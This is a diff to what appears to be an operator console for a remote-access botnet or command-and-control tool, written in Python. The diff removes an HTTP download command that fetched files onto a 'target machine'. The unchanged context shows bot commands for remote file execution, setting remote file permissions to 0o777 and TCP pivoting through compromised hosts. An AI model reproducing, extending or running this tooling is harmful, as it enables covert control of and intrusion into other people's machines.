@@ -278,7 +278,7 @@ CMD_FILE_EXEC           = BASE_CMD_FILE + 3
 CMD_FILE_CHMOD          = BASE_CMD_FILE + 4
 
 # Network commands.
-CMD_HTTP_DOWNLOAD       = BASE_CMD_NET + 0
+#CMD_HTTP_DOWNLOAD       = BASE_CMD_NET + 0  # deprecated since Apr 2021
 CMD_DNS_RESOLVE         = BASE_CMD_NET + 1
 CMD_TCP_PIVOT           = BASE_CMD_NET + 2
 
@@ -686,11 +686,6 @@ class Bot(object):
     @bot_action
     def file_chmod(self, remote_file, mode_flags = 0o777):
         self.sock.sendall( build_command(CMD_FILE_CHMOD, pack("!H", mode_flags) + remote_file) )
-        get_resp_no_data(self.sock)
-
-    @bot_action
-    def http_download(self, url, remote_file):
-        self.sock.sendall( build_command(CMD_HTTP_DOWNLOAD, url, remote_file) )
         get_resp_no_data(self.sock)
 
     @bot_action
@@ -1746,33 +1741,6 @@ class Console(Cmd):
 
         # Print the output from the command to screen.
         print(output)
-
-    def do_download(self, line):
-        """
-    \x1b[32m\x1b[1mdownload\x1b[0m <\x1b[34m\x1b[1murl\x1b[0m> <\x1b[34m\x1b[1mremote file\x1b[0m>
-
-    Download a file via HTTP into the target machine.
-    Use the "\x1b[32m\x1b[1mpull\x1b[0m" command to retrieve the file locally afterwards.\n"""
-
-        # A bot must be selected.
-        if self.current is None:
-            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
-            return
-
-        # The bot must not be busy.
-        if self.is_bot_busy():
-            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
-            return
-
-        # Parse the arguments, on error show help.
-        try:
-            url, remote_file = split(line, comments=True)
-        except Exception:
-            self.onecmd("help download")
-            return
-
-        # Perform the operation.
-        self.current.http_download(url, remote_file)
 
     def do_fork(self, line):
         """
